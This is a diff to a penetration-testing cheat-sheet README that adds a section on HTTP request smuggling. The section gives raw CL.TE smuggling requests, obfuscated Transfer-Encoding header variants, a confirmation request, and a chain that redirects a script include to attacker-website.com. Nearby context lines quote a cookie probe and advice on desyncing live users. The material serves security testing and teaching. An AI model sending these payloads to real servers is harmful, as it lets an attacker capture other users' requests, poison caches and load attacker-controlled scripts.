@@ -45,7 +45,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Server-side template injection](#server-side-template-injection)
   - [Web cache poisoning](#web-cache-poisoning)
   - [HTTP Host header attacks](#http-host-header-attacks)
-  - HTTP request smuggling
+  - [HTTP request smuggling](#http-request-smuggling)
   - [OAuth authentication](#oauth-authentication)
   - [JWT Attacks](#jwt-attacks)
   - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
@@ -1124,6 +1124,127 @@ Many websites and CDNs perform various transformations on keyed components when 
 - "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
 curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
 - CRLF injection [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)], "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]
+
+
+### <ins>HTTP request smuggling</ins>
+
+Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends:
+- Content-Length
+  ```
+  POST /search HTTP/1.1
+  Host: normal-website.com
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 11
+  q=smuggling
+  ```
+- Transfer-Encoding
+  ```
+  POST /search HTTP/1.1
+  Host: normal-website.com
+  Content-Type: application/x-www-form-urlencoded
+  Transfer-Encoding: chunked
+  b
+  q=smuggling
+  0
+  ```
+  
+Example
+```
+POST / HTTP/1.1
+Host: smuggle-vulnerable.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+Result: GPOST request
+- Some servers do not support the Transfer-Encoding header in requests;
+- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
+
+Ways to obfuscate the Transfer-Encoding header
+- `Transfer-Encoding: xchunked`
+- `Transfer-Encoding : chunked`
+- `Transfer-Encoding: chunked`
+- `Transfer-Encoding: x`
+- `Transfer-Encoding:[tab]chunked`
+- `[space]Transfer-Encoding: chunked`
+- `X: X[\n]Transfer-Encoding: chunked`
+- ```
+  Transfer-Encoding
+  : chunked
+  ```
+
+Confirming CL.TE vulnerabilities using differential responses
+```
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+
+
+```
+
+Result
+```
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+Impact
+- Bypass front-end security controls
+- Revealing front-end request rewriting
+- Capturing other users' requests
+- Using HTTP request smuggling to exploit reflected XSS
+- Turn an on-site redirect into an open redirect<br/>
+  Example of 301 in Apache and IIS web servers
+  ```
+  GET /home HTTP/1.1
+  Host: normal-website.com
+  HTTP/1.1 301 Moved Permanently
+  Location: https://normal-website.com/home/
+  ```
+  Vulnerable request
+  ```
+  POST / HTTP/1.1
+  Host: vulnerable-website.com
+  Content-Length: 54
+  Transfer-Encoding: chunked
+  
+  0
+  
+  GET /home HTTP/1.1
+  Host: attacker-website.com
+  Foo: X
+  ```
+  Result
+  ```
+  GET /home HTTP/1.1
+  Host: attacker-website.com
+  Foo: XGET /scripts/include.js HTTP/1.1
+  Host: vulnerable-website.com
+  HTTP/1.1 301 Moved Permanently
+  Location: https://attacker-website.com/home/
+  ```
+- Perform web cache poisoning
+- Perform web cache deception
 
 
 
